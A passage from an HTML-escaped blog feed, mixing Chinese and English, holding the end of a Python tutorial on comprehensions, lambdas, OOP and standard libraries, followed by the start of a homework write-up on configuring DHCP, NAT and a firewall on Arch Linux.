&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="ow"&gt;not&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="c1"&gt;# [0, 2, 4, 6, 8]  &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;+ 可以用這樣的方式很快的檢測使用者輸入的資料  
+ 可以是巢狀的
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;generator comprehension  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;(i for i in range(10))&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;回傳的值不是 tuple，而是 generator  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;lazy evaluation  &lt;ul&gt;
&lt;li&gt;save memory  &lt;/li&gt;
&lt;li&gt;會等到真的必須要求值的時候才會計算  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Other Comprehensions  &lt;ul&gt;
&lt;li&gt;set comprehension  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;set(i for i in range(10)) # python2 or 3&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;{i for i in range(10)}    # python3 only&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;dict Comprehension  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;dict((i,i) for i in range(10)) # python2 or 3&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;{i:i for i in range(10)}       # python3 only&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Functional Technique&lt;/h2&gt;
&lt;h3&gt;any() / all()&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nb"&gt;all&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;seq&lt;/span&gt; &lt;span class="p"&gt;)&lt;/span&gt;  
&lt;span class="c1"&gt;# seq 裏面只要有一個條件不符合的話 就會回傳false  &lt;/span&gt;

&lt;span class="c1"&gt;# 如果 iterable 是空的話，all() 會回傳 True  &lt;/span&gt;
&lt;span class="nb"&gt;all&lt;/span&gt;&lt;span class="p"&gt;(())&lt;/span&gt;  
&lt;span class="nb"&gt;all&lt;/span&gt;&lt;span class="p"&gt;([])&lt;/span&gt;  
&lt;span class="nb"&gt;all&lt;/span&gt;&lt;span class="p"&gt;({})&lt;/span&gt;  
&lt;span class="c1"&gt;# 三者的結果皆為 True  &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nb"&gt;any&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;seq&lt;/span&gt; &lt;span class="p"&gt;)&lt;/span&gt;  
&lt;span class="c1"&gt;# seq 裏面只要有一個條件符合的話 就會回傳true  &lt;/span&gt;

&lt;span class="c1"&gt;# 如果 iterable 是空的話，any() 會回傳 False  &lt;/span&gt;
&lt;span class="nb"&gt;any&lt;/span&gt;&lt;span class="p"&gt;(())&lt;/span&gt;  
&lt;span class="nb"&gt;any&lt;/span&gt;&lt;span class="p"&gt;([])&lt;/span&gt;  
&lt;span class="nb"&gt;any&lt;/span&gt;&lt;span class="p"&gt;({})&lt;/span&gt;  
&lt;span class="c1"&gt;# 三者的結果皆為 False  &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h4&gt;用 list comprehension 和 any() / all() 產生 100 內的質數表&lt;/h4&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;n&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;n&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;100&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="ow"&gt;not&lt;/span&gt; &lt;span class="nb"&gt;any&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;n&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="p"&gt;))]&lt;/span&gt;  

&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;n&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;n&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;100&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="nb"&gt;all&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;n&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="p"&gt;))]&lt;/span&gt;  

&lt;span class="c1"&gt;# 寫的時候先考慮後面每個 element 的條件  &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;lamda expression&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;lambda&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="p"&gt;]:&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;expression&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;  
&lt;span class="c1"&gt;# 其實就是一個小型的 function  &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h4&gt;anonymous function&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;a single expression  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;f&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;lambda&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;g&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;h&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  

&lt;span class="n"&gt;do&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;lambda&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;y&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;y&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;y&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;20&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;h4&gt;use sort with lambda&lt;/h4&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# 想要讓 dict 按照 value 的順序排列, 而不是 key 的順序  &lt;/span&gt;
&lt;span class="n"&gt;d&lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;dict&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;300&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;b&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;200&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;c&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;100&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  
&lt;span class="n"&gt;keys&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;d&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;keys&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;  
&lt;span class="n"&gt;keys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sort&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="k"&gt;lambda&lt;/span&gt; &lt;span class="n"&gt;k&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;d&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;k&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;  
&lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;k&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;keys&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;  
&lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="n"&gt;k&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;d&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;k&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;利用 unpack 和 zip 達到轉置矩陣的效果&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;r&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;a&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;b&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;c&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;d&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)]&lt;/span&gt;  
&lt;span class="n"&gt;r&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;zip&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;# 先把 r 拆開, 再重新拼起來  &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;map/filter&lt;/h3&gt;
&lt;h3&gt;reduce&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;兩個兩個運算後回傳結果  &lt;/li&gt;
&lt;li&gt;python3 的 &lt;code&gt;reduce()&lt;/code&gt; 已經不是 built-in function  &lt;ul&gt;
&lt;li&gt;要用的話要記得 &lt;code&gt;import functools&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;然後用 &lt;code&gt;functools.reduce()&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;partial&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://docs.python.org/2/library/functools.html#functools.partial"&gt;9.8. functools — Higher-order functions and operations on callable objects — Python 2.7.10 documentation&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://docs.python.org/3/library/functools.html#functools.partial"&gt;10.2. functools — Higher-order functions and operations on callable objects — Python 3.5.0 documentation&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Closure&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.codedata.com.tw/java/understanding-lambda-closure-3-python-support/"&gt;認識 Lambda/Closure（3）Python 對 Lambda/Closure 的支援 by caterpillar | CodeData&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://wiki.python.org.tw/Python/Cookbook/Closure"&gt;Python/Cookbook/Closure - Python Taiwan Wiki&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://fcamel-life.blogspot.tw/2010/02/python-closure.html"&gt;fcamel 技術隨手記: Python 的 Closure&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.diveintopython3.net/generators.html"&gt;Closures &amp;amp; Generators - Dive Into Python 3&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;yield&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;coroutine  &lt;/li&gt;
&lt;li&gt;用 &lt;code&gt;yield&lt;/code&gt; 取代 &lt;code&gt;return&lt;/code&gt; 的話, 會回傳 generator  &lt;ul&gt;
&lt;li&gt;可以被疊代, 比較不耗記憶體  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;OOP in python&lt;/h2&gt;
&lt;h3&gt;The &lt;code&gt;class&lt;/code&gt; Statement&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;Example&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;object&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;  
    &lt;span class="n"&gt;class_attribute&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;  

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;method&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;...&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;  
        &lt;span class="k"&gt;pass&lt;/span&gt;  

&lt;span class="n"&gt;example&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Example&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;  
&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="n"&gt;example&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;Everythin in Python is &lt;code&gt;object&lt;/code&gt;.  &lt;ul&gt;
&lt;li&gt;Class is also an &lt;code&gt;object&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;All &lt;code&gt;class&lt;/code&gt; inherit the &lt;code&gt;object&lt;/code&gt; (new-style classes)  &lt;/li&gt;
&lt;li&gt;Support multiple inheritance  &lt;ul&gt;
&lt;li&gt;Searching attributes / methods like BFS.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Bound and Unbound Method&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;bound method (instance method)  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;c.m(...)&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;unbound  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;def m(self, ...):&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;C.m(c, ...)&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Class Method and Static Method&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;class method  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nd"&gt;@classmethod&lt;/span&gt;  
&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;m&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;cls&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;...&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;static method  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nd"&gt;@staticmethod&lt;/span&gt;  
&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;m&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;...&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;ref  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://stackoverflow.com/questions/12179271/python-classmethod-and-staticmethod-for-beginner"&gt;oop - Python @classmethod and @staticmethod for beginner? - Stack Overflow&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.zhihu.com/question/20021164"&gt;Python 中的 classmethod 和 staticmethod 有什么具体用途？ - Python - 知乎&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://pythoncentral.io/difference-between-staticmethod-and-classmethod-in-python/"&gt;Difference between @staticmethod and @classmethod in Python - Python Central&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://missions5.blogspot.tw/2014/12/python-classmethod-and-staticmethod.html"&gt;迷失霧的迷思: python @classmethod and @ staticmethod 的不同(筆記)&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;The Data Model of Python&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Special methods  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;__init__&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;__str__&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;__repr__&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;__getitem__&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;x[key]&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;__setitem__&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;x[key] = value&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;__delitem__&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;del x[key]&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;ref  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://docs.python.org/2/reference/datamodel.html"&gt;3. Data model — Python 2.7.10 documentation&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://docs.python.org/3/reference/datamodel.html"&gt;3. Data model — Python 3.5.0 documentation&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Useful Libraies&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;collections&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;re&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;random&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;datetime&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;decimal&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;寫金融軟體的話要用 &lt;code&gt;decimal&lt;/code&gt; 不要用 &lt;code&gt;float&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;pickle&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;json&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;timeit&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;對程式做計時, 看效率  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;doctest&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;unittest&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;pdb&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;debugger  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;requests&lt;/code&gt; (3rd party)  &lt;ul&gt;
&lt;li&gt;拿來送 http request 的, 內建的 &lt;code&gt;urlib&lt;/code&gt; 很難用  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;flask&lt;/code&gt; (3rd party)  &lt;ul&gt;
&lt;li&gt;a web framework  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</summary><category term="Python"></category><category term="Tutorial"></category></entry><entry><title>Network Administration Hw1: Setup DHCP, NAT, Firewall</title><link href="https://blog.m157q.tw/posts/2013/04/09/network-administration-hw1-setup-dhcp-nat-firewall/" rel="alternate"></link><published>2015-10-27T21:31:00+08:00</published><updated>2015-10-27T21:31:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2013-04-09:posts/2013/04/09/network-administration-hw1-setup-dhcp-nat-firewall/</id><summary type="html">&lt;h2&gt;Setup DHCP, NAT, Firewall&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;I done this homework in Arch Linux  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr /&gt;
&lt;h2&gt;SPEC&lt;/h2&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;Server - dhcp server, NAT, Firewall, ftp-proxy, transparent http proxy (TP)  
(home-q) dhcp server =&amp;gt; dhcpd;  
         NAT, Firewall, ftp-proxy =&amp;gt; iptables;  
         transparent http proxy =&amp;gt; squid;  
         外網網卡 enp0s18 140.113.27.37  
         內網網卡 enp0s19 172.16.1.254  
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;HostA -  dhcp client with private ip (172.16.1.101~172.16.1.200)  
(www-q)  http client browse through Server&amp;#39;s TP  
         dhcp client =&amp;gt; dhcpcd;  
         內網網卡 enp0s18  
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;HostB -  dhcp client with static private ip (172.16.1.30)  
(mail-q) provide ssh service (bind on Server&amp;#39;s 222 port)  
         provide ftp service (bind on Server&amp;#39;s 21 port)  
         ftp service =&amp;gt; vsftpd;  
         內網網卡 enp0s18; MAC 5a:49:97:32:c3:13 (拿來給 dhcpd 發 static private ip)  
&lt;/pre&gt;&lt;/div&gt;


&lt;hr /&gt;
&lt;h2&gt;DHCP server (on home-q)&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://wiki.archlinux.org/index.php/Dhcpd"&gt;https://wiki.archlinux.org/index.php/Dhcpd&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://linux.vbird.org/linux_server/0340dhcp.php"&gt;http://linux.vbird.org/linux_server/0340dhcp.php&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;基本上就照著 Arch wiki 作&lt;br /&gt;
&lt;code&gt;# ip addr add 172.16.1.254/24 dev enp0s19&lt;/code&gt;&lt;br /&gt;
然後在 &lt;code&gt;/etc/dhcpd.conf&lt;/code&gt; 中寫下規則  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nt"&gt;option&lt;/span&gt; &lt;span class="nt"&gt;domain-name&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;nctucs.net&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt;  
